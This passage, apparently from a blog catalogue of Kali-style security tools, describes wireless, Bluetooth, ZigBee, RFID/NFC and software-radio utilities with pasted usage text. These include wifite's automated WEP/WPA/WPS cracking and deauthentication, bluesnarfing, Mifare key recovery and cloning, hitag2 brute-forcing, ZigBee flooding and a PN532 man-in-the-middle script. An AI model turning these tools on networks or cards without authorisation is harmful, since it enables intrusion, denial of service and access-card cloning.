<p>Robin Wood <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x72;&#x6f;&#x62;&#x69;&#110;&#64;&#x64;&#x69;&#x67;&#105;&#x6e;&#105;&#110;&#x6a;&#97;&#x2e;&#x6f;&#x72;&#103;">&#114;&#x6f;&#x62;&#x69;&#x6e;&#x40;&#100;&#x69;&#x67;&#105;&#110;&#105;&#x6e;&#x6a;&#x61;&#46;&#x6f;&#x72;&#x67;</a>
See Security Tube Wifi Mega Primer episode 26 for more information
```</p>

<p><strong>wifiping</strong></p>

<p>Wifi injection based answering tool based on Wifitap</p>

<p><strong>wifitap</strong></p>

<p>Wifitap is a proof of concept for communication over WiFi networks using traffic injection.</p>

<p>Wifitap allows any application do send and receive IP packets using 802.11 traffic capture and injection over a WiFi network simply configuring wj0, which means :</p>

<ul>
<li><p>setting an IP address consistent with target network address range</p></li>
<li><p>routing desired traffic through it</p></li>
</ul>


<p>In particular, it’s a cheap method for arbitrary packets injection in 802.11 frames without specific library.</p>

<p>In addition, it will allow one to get rid of any limitation set at access point level, such as bypassing inter-client communications prevention systems (e.g. Cisco PSPF) or reaching multiple SSID handled by the same access point.</p>

<p><img class="center" src="/images/kali/wifi/wifitap.png" title="&lsquo;wifitap&rsquo; &lsquo;wifitap&rsquo;" ></p>

<p><strong>wifite</strong></p>

<p>An automated wireless attack tool. To attack multiple WEP, WPA, and WPS encrypted networks in a row. This tool is customizable to be automated with only a few arguments. Wifite aims to be the &ldquo;set it and forget it&rdquo; wireless auditing tool.</p>

<p>Features</p>

<ul>
<li><p>sorts targets by signal strength (in dB); cracks closest access points first</p></li>
<li><p>automatically de-authenticates clients of hidden networks to reveal SSIDs</p></li>
<li><p>numerous filters to specify exactly what to attack (wep/wpa/both, above certain signal strengths, channels, etc)</p></li>
<li><p>customizable settings (timeouts, packets/sec, etc)</p></li>
<li><p>&ldquo;anonymous&rdquo; feature; changes MAC to a random address before attacking, then changes back when attacks are complete</p></li>
<li><p>all captured WPA handshakes are backed up to wifite.py&rsquo;s current directory</p></li>
<li><p>smart WPA de-authentication; cycles between all clients and broadcast deauths</p></li>
<li><p>stop any attack with Ctrl+C, with options to continue, move onto next target, skip to cracking, or exit</p></li>
<li><p>displays session summary at exit; shows any cracked keys</p></li>
<li><p>all passwords saved to cracked.txt</p></li>
<li><p>built-in updater: ./wifite.py -upgrade</p></li>
</ul>


<p><code>`` plain
 .;'                    </code>;,  <br/>
 .;&lsquo;  ,;&rsquo;             <code>;, </code>;,   WiFite v2 (r85)
.;&lsquo;  ,;&rsquo;  ,;&lsquo;     <code>;, </code>;,  `;,<br/>
::   ::   :   ( )   :   ::   ::  automated wireless auditor
&rsquo;:.  &lsquo;:.  &rsquo;:. /<em>\ ,:&lsquo;  ,:&rsquo;  ,:&lsquo;<br/>
 &rsquo;:.  &lsquo;:.    /</em><strong>\    ,:&rsquo;  ,:&lsquo;   designed for Linux
  &rsquo;:.       /</strong>___\      ,:'</p>

<pre><code>       /       \             
</code></pre>

<p>   COMMANDS</p>

<pre><code>-check &lt;file&gt;   check capfile &lt;file&gt; for handshakes.
-cracked        display previously-cracked access points
</code></pre>

<p>   GLOBAL</p>

<pre><code>-all            attack all targets.              [off]
-i &lt;iface&gt;      wireless interface for capturing [auto]
-mac            anonymize mac address            [off]
-c &lt;channel&gt;    channel to scan for targets      [auto]
-e &lt;essid&gt;      target a specific access point by ssid (name)  [ask]
-b &lt;bssid&gt;      target a specific access point by bssid (mac)  [auto]
-showb          display target BSSIDs after scan               [off]
-pow &lt;db&gt;       attacks any targets with signal strenghth &gt; db [0]
-quiet          do not print list of APs during scan           [off]
</code></pre>

<p>   WPA</p>

<pre><code>-wpa            only target WPA networks (works with -wps -wep)   [off]
-wpat &lt;sec&gt;     time to wait for WPA attack to complete (seconds) [500]
-wpadt &lt;sec&gt;    time to wait between sending deauth packets (sec) [10]
-strip          strip handshake using tshark or pyrit             [off]
-crack &lt;dic&gt;    crack WPA handshakes using &lt;dic&gt; wordlist file    [off]
-dict &lt;file&gt;    specify dictionary to use when cracking WPA [phpbb.txt]
-aircrack       verify handshake using aircrack [on]
-pyrit          verify handshake using pyrit    [off]
-tshark         verify handshake using tshark   [on]
-cowpatty       verify handshake using cowpatty [off]
</code></pre>

<p>   WEP</p>

<pre><code>-wep            only target WEP networks [off]
-pps &lt;num&gt;      set the number of packets per second to inject [600]
-wept &lt;sec&gt;     sec to wait for each attack, 0 implies endless [600]
-chopchop       use chopchop attack      [on]
-arpreplay      use arpreplay attack     [on]
-fragment       use fragmentation attack [on]
-caffelatte     use caffe-latte attack   [on]
-p0841          use -p0841 attack        [on]
-hirte          use hirte (cfrag) attack [on]
-nofakeauth     stop attack if fake authentication fails    [off]
-wepca &lt;n&gt;      start cracking when number of ivs surpass n [10000]
-wepsave        save a copy of .cap files to this directory [off]
</code></pre>

<p>   WPS</p>

<pre><code>-wps        only target WPS networks         [off]
-wpst &lt;sec&gt;     max wait for new retry before giving up (0: never)  [660]
-wpsratio &lt;per&gt; min ratio of successful PIN attempts/total tries    [0]
-wpsretry &lt;num&gt; max number of retries for same PIN before giving up [0]
</code></pre>

<p>   EXAMPLE</p>

<pre><code>./wifite.py -wps -wep -c 6 -pps 600
</code></pre>

<p> [+] quitting
```</p>

<h3>Bluetooth Tools</h3>

<p><strong>bluelog</strong></p>

<p>Bluelog  is  a simple Bluetooth scanner that is designed to essentially
do just one thing, log all the discoverable devices in the area. It  is
intended  to  be  used as a site survey tool, identifying the number of
possible Bluetooth targets there are in the surrounding environment.</p>

<p>``` plain</p>

<h2>Bluelog (v1.1.2) by Tom Nardi &ldquo;MS3FGX&rdquo; (<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x4d;&#x53;&#51;&#70;&#x47;&#x58;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#109;">&#77;&#x53;&#51;&#x46;&#x47;&#x58;&#x40;&#103;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a>)</h2>

<p>Bluelog is a Bluetooth site survey tool, designed to tell you how
many discoverable devices there are in an area as quickly as possible.
As the name implies, its primary function is to log discovered devices
to file rather than to be used interactively. Bluelog could run on a
system unattended for long periods of time to collect data.</p>

<p>Bluelog also includes a mode called &ldquo;Bluelog Live&rdquo; which creates a
webpage of the results that you can serve up with your HTTP daemon of
choice. See the &ldquo;README.LIVE&rdquo; file for details.</p>

<p>For more information, see: www.digifail.com</p>

<p>Basic Options:</p>

<pre><code>-i &lt;interface&gt;     Sets scanning device, default is "hci0"
-o &lt;filename&gt;      Sets output filename, default is "devices.log"
-v                 Verbose, prints discovered devices to the terminal
-q                 Quiet, turns off nonessential terminal outout
-d                 Enables daemon mode, Bluelog will run in background
-k                 Kill an already running Bluelog process
-l                 Start "Bluelog Live", default is disabled
</code></pre>

<p>Logging Options:</p>

<pre><code>-n                 Write device names to log, default is disabled
-m                 Write device manufacturer to log, default is disabled
-c                 Write device class to log, default is disabled
-f                 Use "friendly" device class, default is disabled
-t                 Write timestamps to log, default is disabled
-x                 Obfuscate discovered MACs, default is disabled
-e                 Encode discovered MACs with CRC32, default disabled
-b                 Enable BlueProPro log format, see README
</code></pre>

<p>Advanced Options:</p>

<pre><code>-r &lt;retries&gt;       Name resolution retries, default is 3
-a &lt;minutes&gt;       Amnesia, Bluelog will forget device after given time
-w &lt;seconds&gt;       Scanning window in seconds, see README
-s                 Syslog only mode, no log file. Default is disabled
</code></pre>

<p>```</p>

<p><strong>bluemaho</strong></p>

<p>BlueMaho is GUI-shell (interface) for suite of tools for testing security of bluetooth devices. It is freeware, opensource, written on python, uses wxPyhon. It can be used for testing BT-devices for known vulnerabilities and major thing to do – testing to find unknown vulns. Also it can form nice statistics.</p>

<p>Features:</p>

<ul>
<li><p>scan for devices, show advanced info, SDP records, vendor etc</p></li>
<li><p>track devices – show where and how much times device was seen, its name changes</p></li>
<li><p>loop scan – it can scan all time, showing you online devices</p></li>
<li><p>alerts with sound if new device found</p></li>
<li><p>on_new_device – you can specify what command should it run when it founds new device</p></li>
<li><p>it can use separate dongles – one for scaning (loop scan) and one for running tools or exploits</p></li>
<li><p>send files</p></li>
<li><p>change name, class, mode, BD_ADDR of local HCI devices</p></li>
<li><p>save results in database</p></li>
<li><p>form nice statistics (uniq devices by day/hour, vendors, services etc)</p></li>
<li><p>test remote device for known vulnerabilities (see exploits for more details)</p></li>
<li><p>test remote device for unknown vulnerabilities (see tools for more details)</p></li>
<li><p>themes! you can customize it</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/bluemaho.png" title="&lsquo;bluemaho&rsquo; &lsquo;bluemaho&rsquo;" ></p>

<p><strong>blueranger</strong></p>

<p>BlueRanger is a simple Bash script which uses Link Quality to locate Bluetooth device radios. It sends l2cap (Bluetooth) pings to create a connection between Bluetooth interfaces, since most devices allow pings without any authentication or authorization. The higher the link quality, the closer the device (in theory).</p>

<p>Use a Bluetooth Class 1 adapter for long range location detection. Switch to a Class 3 adapter for more precise short range locating. The recision and accuracy depend on the build quality of the Bluetooth adapter, interference, and response from the remote device. Fluctuations may occur even when neither device is in motion.</p>

<p>``` plain
BlueRanger 1.0 by JP Dunning (.ronin)
&lt;www.hackfromacave.com>
&copy; 2009-2012 Shadow Cave LLC.</p>

<p>NAME</p>

<pre><code>blueranger
</code></pre>

<p>SYNOPSIS</p>

<pre><code>    blueranger.sh &lt;hciX&gt; &lt;bdaddr&gt;
</code></pre>

<p>DESCRIPTION</p>

<pre><code>&lt;hciX&gt;         Local interface
&lt;bdaddr&gt;       Remote Device Address
</code></pre>

<p>```</p>

<p><strong>bluesnarfer</strong></p>

<p>A Bluetooth bluesnarfing Utility.</p>

<p><img class="center" src="/images/kali/wifi/bluesnarfer.png" title="&lsquo;bluesnarfer&rsquo; &lsquo;bluesnarfer&rsquo;" ></p>

<p><strong>btscanner</strong></p>

<p>btscanner is a tool designed specifically to extract as  much  information  as  possible  from  a Bluetooth device without the requirement to
pair. A detailed information screen extracts HCI and  SDP  information,
and  maintains an open connection to monitor the RSSI and link quality.
btscanner is based on the BlueZ Bluetooth stack, which is included with
recent  Linux kernels, and the BlueZ toolset. btscanner also contains a
complete listing of the IEEE OUI numbers and class lookup tables. Using
the information gathered from these sources it is possible to make educated guesses as to the host device type.</p>

<p>``` plain
Usage: btscanner [options]
options</p>

<pre><code>--help  Display help
--cfg=&lt;file&gt;    Use &lt;file&gt; as the config file
--no-reset  Do not reset the Bluetooth adapter before scanning
</code></pre>

<p>```</p>

<p><strong>redfang</strong></p>

<p>RedFang is a small proof-of-concept application to find non discoverable Bluetooth devices. This is done by brute forcing the last six (6) bytes of the Bluetooth address of the device and doing a read_remote_name().</p>

<p><img class="center" src="/images/kali/wifi/redfang.png" title="&lsquo;redfang&rsquo; &lsquo;redfang&rsquo;" ></p>

<p><strong>spooftooph</strong></p>

<p>Spooftooph is designed to automate spoofing or cloning Bluetooth device information. Make a Bluetooth device hide in plain site.</p>

<p>Features:</p>

<ul>
<li><p>Clone and log Bluetooth device information</p></li>
<li><p>Generate a random new Bluetooth profile</p></li>
<li><p>Change Bluetooth profile every X seconds</p></li>
<li><p>Specify device information for Bluetooth interface</p></li>
<li><p>Select device to clone from scan log</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/spooftooph.png" title="&lsquo;spooftooph&rsquo; &lsquo;spooftooph&rsquo;" ></p>

<h3>Other Wireless Tools</h3>

<p><strong>zbassocflood</strong></p>

<p>Transmit a flood of associate requests to a target network.</p>

<p>``` plain
zbassocflood: Transmit a flood of associate requests to a target network.
<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#119;&#114;&#x69;&#103;&#104;&#x74;&#x40;&#119;&#105;&#x6c;&#x6c;&#x68;&#97;&#99;&#107;&#x66;&#111;&#114;&#x73;&#117;&#115;&#x68;&#105;&#x2e;&#99;&#x6f;&#109;">&#x6a;&#119;&#114;&#x69;&#103;&#x68;&#116;&#x40;&#x77;&#105;&#108;&#x6c;&#104;&#x61;&#99;&#107;&#x66;&#x6f;&#114;&#115;&#x75;&#115;&#104;&#x69;&#46;&#x63;&#x6f;&#x6d;</a></p>

<p>Usage: zbassocflood [-pcDis] [-i devnumstring] [-p PANID] [-c channel]</p>

<pre><code>                    [-s per-packet delay/float]
</code></pre>

<p>e.x. zbassocflood -p 0xBAAD -c 11 -s 0.1
```</p>

<p><strong>zbdsniff</strong></p>

<p>Decode plaintext key ZigBee delivery from a capture file.  Will
process libpcap or Daintree SNA capture files.</p>

<p>``` plain
zbdsniff: Decode plaintext key ZigBee delivery from a capture file.  Will
process libpcap or Daintree SNA capture files.    <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#106;&#x77;&#114;&#x69;&#103;&#104;&#x74;&#x40;&#x77;&#105;&#108;&#x6c;&#x68;&#x61;&#x63;&#107;&#102;&#x6f;&#114;&#x73;&#x75;&#x73;&#x68;&#105;&#x2e;&#99;&#111;&#109;">&#x6a;&#x77;&#114;&#x69;&#103;&#104;&#116;&#x40;&#x77;&#x69;&#108;&#108;&#x68;&#97;&#x63;&#x6b;&#x66;&#111;&#x72;&#x73;&#x75;&#x73;&#x68;&#105;&#46;&#99;&#111;&#x6d;</a></p>

<p>Usage: zbdsniff [capturefiles &hellip;]
```</p>

<p><strong>zbdump</strong></p>

<p>A tcpdump-like tool for ZigBee/IEEE 802.15.4 networks</p>

<p>``` plain
zbdump &ndash; a tcpdump-like tool for ZigBee/IEEE 802.15.4 networks
Compatible with Wireshark 1.1.2 and later &ndash; <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#106;&#119;&#x72;&#x69;&#x67;&#x68;&#116;&#x40;&#119;&#105;&#108;&#x6c;&#104;&#97;&#99;&#x6b;&#x66;&#x6f;&#114;&#x73;&#117;&#115;&#x68;&#x69;&#46;&#99;&#x6f;&#109;">&#106;&#119;&#x72;&#x69;&#103;&#104;&#116;&#x40;&#x77;&#105;&#108;&#108;&#x68;&#97;&#x63;&#x6b;&#102;&#111;&#114;&#x73;&#x75;&#x73;&#104;&#x69;&#x2e;&#99;&#x6f;&#109;</a></p>

<p>Usage: zbdump [-fiwDch] [-f channel] [-w pcapfile] [-W daintreefile]</p>

<pre><code>     [-i devnumstring]
</code></pre>

<p>```</p>

<p><strong>zbfind</strong></p>

<p>zbfind provides a GTK-based GUI to the user which displays the results of a zbstumbler-like functionality. zbfind sends beacon requests as it cycles through channels and listens for a response, adding the response to a table as well as displaying signal strength on a gauge widget.</p>

<p><img class="center" src="/images/kali/wifi/zbfind.png" title="&lsquo;zbfind&rsquo; &lsquo;zbfind&rsquo;" ></p>

<p><strong>zbgoodfind</strong></p>

<p>Search a binary file to identify the encryption key for a given
SNA or libpcap IEEE 802.15.4 encrypted packet</p>

<p>``` plain
zbgoodfind &ndash; search a binary file to identify the encryption key for a given
SNA or libpcap IEEE 802.15.4 encrypted packet &ndash; <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6a;&#x77;&#114;&#105;&#x67;&#x68;&#x74;&#x40;&#119;&#x69;&#108;&#x6c;&#104;&#97;&#x63;&#x6b;&#102;&#111;&#114;&#x73;&#117;&#115;&#104;&#105;&#46;&#99;&#111;&#x6d;">&#x6a;&#x77;&#x72;&#105;&#103;&#104;&#116;&#x40;&#x77;&#x69;&#108;&#x6c;&#x68;&#x61;&#99;&#x6b;&#x66;&#x6f;&#114;&#x73;&#117;&#115;&#x68;&#105;&#46;&#x63;&#111;&#x6d;</a></p>

<p>Usage: zbgoodfind [-frRFd] [-f binary file] [-r pcapfile] [-R daintreefile]</p>

<pre><code>     [-F Don't skip 2-byte FCS at end of each frame]
     [-d genenerate binary file (test mode)]
</code></pre>

<p>```</p>

<p><strong>zbreplay</strong></p>

<p>Replay ZigBee/802.15.4 network traffic from libpcap or Daintree files</p>

<p>``` plain
zbreplay: replay ZigBee/802.15.4 network traffic from libpcap or Daintree files
<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x6a;&#119;&#x72;&#x69;&#x67;&#x68;&#x74;&#64;&#119;&#105;&#108;&#x6c;&#104;&#x61;&#x63;&#x6b;&#x66;&#111;&#114;&#x73;&#117;&#115;&#x68;&#x69;&#46;&#x63;&#111;&#x6d;">&#106;&#119;&#114;&#105;&#103;&#x68;&#x74;&#x40;&#119;&#105;&#x6c;&#108;&#x68;&#x61;&#x63;&#x6b;&#102;&#x6f;&#114;&#115;&#x75;&#x73;&#x68;&#x69;&#x2e;&#x63;&#x6f;&#x6d;</a></p>

<p>Usage: zbreplay [-rRfiDch] [-f channel] [-r pcapfile] [-R daintreefile]</p>

<pre><code>     [-i devnumstring] [-s delay/float] [-c countpackets]
</code></pre>

<p>```</p>

<p><strong>zbstumbler</strong></p>

<p>Transmit beacon request frames to the broadcast address while
channel hopping to identify ZC/ZR devices.</p>

<p>``` plain
zbstumbler: Transmit beacon request frames to the broadcast address while
channel hopping to identify ZC/ZR devices.  <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#x6a;&#x77;&#114;&#105;&#103;&#104;&#x74;&#64;&#x77;&#105;&#108;&#108;&#104;&#x61;&#x63;&#107;&#102;&#111;&#114;&#x73;&#x75;&#x73;&#104;&#105;&#x2e;&#x63;&#111;&#109;">&#106;&#119;&#x72;&#x69;&#x67;&#x68;&#x74;&#x40;&#119;&#105;&#108;&#x6c;&#104;&#97;&#99;&#x6b;&#x66;&#x6f;&#x72;&#x73;&#x75;&#x73;&#104;&#105;&#46;&#x63;&#111;&#109;</a></p>

<p>Usage: zbstumbler [-iscwD] [-i devnumstring] [-s per-channel delay] [-c channel]</p>

<pre><code>                      [-w report.csv]
</code></pre>

<p>```</p>

<h3>RFID / NFC Tools</h3>

<h3>NFC Tools</h3>

<p><strong>mfcuk</strong></p>

<p>Toolkit containing samples and various tools based on and around libnfc and crapto1, with emphasis on Mifare Classic NXP/Philips RFID cards. Special emphasis of the toolkit is on the following:</p>

<ul>
<li><p>mifare classic weakness demonstration/exploitation</p></li>
<li><p>demonstrate use of libnfc (and ACR122 readers)</p></li>
<li><p>demonstrate use of Crapto1 implementation to confirm internal workings and to verify theoretical/practical weaknesses/attacks</p></li>
</ul>


<p><strong>mfoc</strong></p>

<p>MFOC is an open source implementation of “offline nested” attack by Nethemba.
This program allow to recover authentication keys from MIFARE Classic card.
Please note MFOC is able to recover keys from target only if it have a known key: default one (hardcoded in MFOC) or custom one (user provided using command line).</p>

<p><strong>mfterm</strong></p>

<p>A terminal interface for working with Mifare tags.</p>

<p>The  program  is  used as an interactive shell to read and write Mifare
tags using libnfc and a libnfc compatible reader or to  simply  manipulate Mifare data dumps from files.</p>

<p>``` plain
A terminal interface for working with Mifare Classic tags.
Usage: mfterm [-v] [-h] [-k keyfile]</p>

<p>Options:
  &mdash;help          (-h)   Show this help message.
  &mdash;version       (-v)   Display version information.
  &mdash;tag=tagfile   (-t)   Load a tag from the specified file.
  &mdash;keys=keyfile  (-k)   Load keys from the specified file.
  &mdash;dict=dictfile (-d)   Load dictionary from the specified file.</p>

<p>Report bugs to: <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x61;&#x6e;&#100;&#x65;&#x72;&#115;&#x40;&#x34;&#x7a;&#x6d;&#x2e;&#111;&#114;&#103;">&#x61;&#x6e;&#x64;&#x65;&#x72;&#x73;&#x40;&#52;&#x7a;&#x6d;&#x2e;&#x6f;&#114;&#103;</a>
mfterm home page: <a href="https://github.com/4zm/mfterm">https://github.com/4zm/mfterm</a>
```</p>

<p><strong>mifare-classic-format</strong></p>

<p>``` plain
usage: mifare-classic-format [-fy] [keyfile]</p>

<p>Options:
  -f      Fast format (only erase MAD)
  -y      Do not ask for confirmation (dangerous)
  keyfile Use keys from dump in addition to internal default keys
```</p>

<p><strong>nfc-list</strong></p>

<p>nfc-list  is  a utility for listing any available tags like ISO14443-A,
FeliCa, Jewel or ISO14443-B (according to the device capabilities).  It
may  detect several tags at once thanks to a mechanism called anti-collision but all types of tags don&rsquo;t support anti-collision and there  is
some physical limitation of the number of tags the reader can discover.</p>

<p>This tool displays all available information at selection time.</p>

<p><code>plain
nfc-list uses libnfc 1.7.0
usage: nfc-list [-v]
  -v     verbose display
</code></p>

<p><strong>nfc-mfclassic</strong></p>

<p>nfc-mfclassic is a MIFARE Classic tool that allow to read or write DUMP
file using MIFARE keys provided in KEYS file.</p>

<p>``` plain
Usage: nfc-mfclassic r|R|w|W a|b &lt;dump.mfd> [&lt;keys.mfd> [f]]
  r|R|w|W       &ndash; Perform read from &reg; or unlocked read from &reg; or write to (w) or unlocked write to (W) card</p>

<pre><code>              *** note that unlocked write will attempt to overwrite block 0 including UID
              *** unlocked read does not require authentication and will reveal A and B keys
              *** unlocking only works with special Mifare 1K cards (Chinese clones)
</code></pre>

<p>  a|A|b|B       &ndash; Use A or B keys for action; Halt on errors (a|b) or tolerate errors (A|B)
  &lt;dump.mfd>    &ndash; MiFare Dump (MFD) used to write (card to MFD) or (MFD to card)
  &lt;keys.mfd>    &ndash; MiFare Dump (MFD) that contain the keys (optional)
  f             &ndash; Force using the keyfile even if UID does not match (optional)
```</p>

<h3>RFIDiot ACG</h3>

<h3>RFIDiot FROSCH</h3>

<h3>RFIDiot PCSC</h3>

<p>A collection of tools and libraries for exploring RFID technology, written
in Python.</p>

<p><strong>ChAP.py</strong></p>

<p>Script that tries to select the EMV Payment Systems Directory on all inserted cards.</p>

<p><strong>bruteforce.py</strong></p>

<p>Try random numbers to login to sector 0</p>

<p><strong>cardselect.py</strong></p>

<p>Select card and display ID</p>

<p><strong>copytag.py</strong></p>

<p>Read all sectors from a standard tag and write them back to a blank</p>

<p><strong>demotag.py</strong></p>

<p>Test IAIK TUG DemoTag</p>

<p><strong>eeprom.py</strong></p>

<p>Display reader&rsquo;s eeprom settings</p>

<p><strong>fdxbnum.py</strong></p>

<p>Generate / decode FDX-B EM4x05 compliant IDs</p>

<p><strong>formatmifare1kvalue.py</strong></p>

<p>Format value blocks on a mifare standard tag</p>

<p><strong>froschtest.py</strong></p>

<p>Test frosch HTRM112 reader</p>

<p><strong>hidprox.py</strong></p>

<p>Show HID Prox card type and site/id code</p>

<p><strong>hitag2brute.py</strong></p>

<p>Brute Force hitag2 password</p>

<p><strong>hitag2reset.py</strong></p>

<p>Reset hitag2 password</p>

<p><strong>isotype.py</strong></p>

<p>Determine ISO tag type</p>

<p><strong>jcopmifare.py</strong></p>

<p>Test program for mifare emulation on JCOP</p>

<p><strong>jcopsetatrhist.py</strong></p>

<p>Set ATR History bytes on JCOP cards</p>

<p><strong>jcoptool.py</strong></p>

<p>JCOP card toolkit</p>

<p><strong>lfxtype.py</strong></p>

<p>Select card and display tag type</p>

<p><strong>loginall.py</strong></p>

<p>Attempt to login to each sector with transport keys</p>

<p><strong>mifarekeys.py</strong></p>

<p>Calculate 3DES key for Mifare access on JCOP cards</p>

<p><strong>mrpkey.py</strong></p>

<p>Calculate 3DES key for Machine Readable Passport</p>

<p><strong>multiselect.py</strong></p>

<p>Continuously select card and display ID</p>

<p><strong>nfcid.py</strong></p>

<p>Python code for Identifying NFC cards</p>

<p><strong>pn532emulate.py</strong></p>

<p>Switch NXP PN532 reader chip into TAG emulation mode</p>

<p><strong>pn532mitm.py</strong></p>

<p>NXP PN532 Man-In-The_Middle &ndash; log conversations between TAG and external reader</p>

<p><strong>q5reset.py</strong></p>

<p>Reset q5 tag</p>

<p><strong>readlfx.py</strong></p>

<p>Read all sectors from a LFX reader</p>

<p><strong>readmifare1k.py</strong></p>

<p>Read all sectors from a mifare standard tag</p>

<p><strong>readmifaresimple.py</strong></p>

<p>Read all sectors from a mifare tag</p>

<p><strong>readmifareultra.py</strong></p>

<p>Read all sectors from a Ultralight tag</p>

<p><strong>readtag.py</strong></p>

<p>Read all sectors from a standard tag</p>

<p><strong>rfidiot-cli.py</strong></p>

<p>CLI for rfidiot</p>

<p><strong>send_apdu.py</strong></p>

<p>Python code for Sending raw APDU commands</p>

<p><strong>sod.py</strong></p>

<p>Try to find X509 data in EF.SOD</p>

<p><strong>transit.py</strong></p>

<p>Generate / decode FDI Matalec Transit 500 and Transit 999 UIDs</p>

<p><strong>unique.py</strong></p>

<p>Generate EM4x02 and/or UNIQUE compliant IDs</p>

<p><strong>writelfx.py</strong></p>

<p>Read and then write all sectors from a LFX reader</p>

<p><strong>writemifare1k.py</strong></p>

<p>Write all blocks on a mifare standard tag</p>

<p>Check <a href="http://rfidiot.org/">http://rfidiot.org/</a> for more information and examples</p>

<h3>Software Defined Radio</h3>

<p><strong>gnuradio-companion</strong></p>

<p>A graphical tool for creating signal flow graphs and generating flow-graph source code.</p>

<p><img class="center" src="/images/kali/wifi/gnuradio.png" title="&lsquo;gnuradio-companion&rsquo; &lsquo;gnuradio&rsquo;" ></p>

<p><strong>gqrx</strong></p>

<p>Gqrx is a software defined radio receiver powered by the GNU Radio SDR framework and the Qt graphical toolkit. Gqrx supports many of the SDR hardware available, including Funcube Dongles, rtl-sdr, HackRF and USRP devices.</p>

<p>Currently it works on Linux and Mac and supports the following devices:. Funcube Dongle Pro and Pro+ RTL2832U-based DVB-T dongles (rtlsdr via USB and TCP) OsmoSDR USRP HackRF Jawbreaker Nuand bladeRF any other device supported by the gr-osmosdr library</p>

<p>The latest stable version of Gqrx is 2.2, it is available for Linux, FreeBSD and Mac and it offers the following features:</p>

<ul>
<li><p>Discover devices attached to the computer.</p></li>
<li><p>Process I/Q data from the supported devices.</p></li>
<li><p>Change frequency, gain and apply various corrections (frequency, I/Q balance).</p></li>
<li><p>AM, SSB, FM-N and FM-W (mono and stereo) demodulators.</p></li>
<li><p>Special FM mode for NOAA APT.</p></li>
<li><p>Variable band pass filter.</p></li>
<li><p>AGC, squelch and noise blankers.</p></li>
<li><p>FFT plot and waterfall.</p></li>
<li><p>Record and playback audio to / from WAV file.</p></li>
<li><p>Spectrum analyzer mode where all signal processing is disabled.</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/gqrx.png" title="&lsquo;gqrx&rsquo; &lsquo;gqrx&rsquo;" ></p>

<p><strong>gr-scan</strong></p>

<p>gr-scan is a program written in C++, and built upon GNU Radio, rtl-sdr, and the OsmoSDR Source Block. It is intended to scan a range of frequencies and print a list of discovered signals. It should work with any device that works with that block, including Realtek RTL2832U devices. This software was developed using a Compro U620F, which uses an E4000 tuner</p>

<p><img class="center" src="/images/kali/wifi/gr-scan.png" title="&lsquo;gr-scan&rsquo; &lsquo;gr-scan&rsquo;" ></p>

<p><strong>modes_gui</strong></p>

<p>Part of gr-air-modes</p>

<p>gr-air-modes implements a software-defined radio receiver for Mode S
transponder signals, including ADS-B reports from equipped aircraft.</p>

<p><strong>rtl_adsb</strong></p>

<p>A simple ADS-B decoder</p>

<p><img class="center" src="/images/kali/wifi/rtl_adsb.png" title="&lsquo;rtl_adsb&rsquo; &lsquo;rtl_adsb&rsquo;" ></p>

<p><strong>rtl_fm</strong></p>

<p>A simple narrow band FM demodulator for RTL2832 based DVB-T receivers</p>

<p>``` plain
Use:    rtl_fm -f freq [-options] [filename]</p>

<pre><code>-f frequency_to_tune_to [Hz]
 (use multiple -f for scanning, requires squelch)
 (ranges supported, -f 118M:137M:25k)
[-s sample_rate (default: 24k)]
[-d device_index (default: 0)]
[-g tuner_gain (default: automatic)]
[-l squelch_level (default: 0/off)]
[-o oversampling (default: 1, 4 recommended)]
[-p ppm_error (default: 0)]
[-E sets lower edge tuning (default: center)]
[-N enables NBFM mode (default: on)]
[-W enables WBFM mode (default: off)]
 (-N -s 170k -o 4 -A fast -r 32k -l 0 -D)
filename (a '-' dumps samples to stdout)
 (omitting the filename also uses stdout)
</code></pre>

<p>Experimental options:</p>

<pre><code>[-r output_rate (default: same as -s)]
[-t squelch_delay (default: 20)]
 (+values will mute/scan, -values will exit)
[-M enables AM mode (default: off)]
[-L enables LSB mode (default: off)]
[-U enables USB mode (default: off)]
[-R enables raw mode (default: off, 2x16 bit output)]
[-F enables high quality FIR (default: off/square)]
[-D enables de-emphasis (default: off)]
[-C enables DC blocking of output (default: off)]
[-A std/fast/lut choose atan math (default: std)]
</code></pre>

<p>Produces signed 16 bit ints, use Sox or aplay to hear them.</p>

<pre><code>rtl_fm ... - | play -t raw -r 24k -e signed-integer -b 16 -c 1 -V1 -
             | aplay -r 24k -f S16_LE -t raw -c 1
  -s 22.5k - | multimon -t raw /dev/stdin
</code></pre>

<p>```</p>

<p><strong>rtl_sdr</strong></p>

<p>An I/Q recorder for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:   -f frequency_to_tune_to [Hz]</p>

<pre><code>[-s samplerate (default: 2048000 Hz)]
[-d device_index (default: 0)]
[-g gain (default: 0 for auto)]
[-b output_block_size (default: 16 * 16384)]
[-n number of samples to read (default: 0, infinite)]
[-S force sync output (default: async)]
filename (a '-' dumps samples to stdout)
</code></pre>

<p>```</p>

<p><strong>rtlsdr-scanner</strong></p>

<p>A cross platform Python frequency scanning GUI for USB TV dongles, using the OsmoSDR rtl-sdr library.
In other words a cheap, simple Spectrum Analyser.
The scanner attempts to overcome the tuner’s frequency response by averaging scans from both the positive and negative frequency offets of the baseband data.</p>

<p><img class="center" src="/images/kali/wifi/rtlsdr-scanner.png" title="&lsquo;rtlsdr-scanner&rsquo; &lsquo;rtlsdr-scanner&rsquo;" ></p>

<p><strong>rtl_tcp</strong></p>

<p>An I/Q spectrum server for RTL2832 based DVB-T receivers</p>

<p>``` plain
Usage:  [-a listen address]</p>

<pre><code>[-p listen port (default: 1234)]
[-f frequency to tune to [Hz]]
